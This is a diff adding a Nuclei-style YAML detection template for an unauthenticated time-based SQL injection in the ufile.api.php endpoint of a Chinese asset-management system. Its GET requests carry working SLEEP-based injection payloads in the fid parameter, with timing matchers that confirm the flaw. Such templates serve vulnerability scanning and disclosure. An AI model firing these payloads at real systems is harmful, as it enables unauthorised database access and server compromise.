@@ -1,0 +1,27 @@
+id: byy-ufile-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 百易云资产管理运营系统ufile.api.php存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/commit/17fce9e8a8e4c711753f586f24a2b8351f367aee#diff-15f087be5009ce781ba822659a015b2d927117e6e50bdb589a57515ea5d29236R14
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(3)))UPCw)"
+      - "{{BaseURL}}/api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(6)))UPCw)"
+      - "{{BaseURL}}/api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(9)))UPCw)"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
+
+
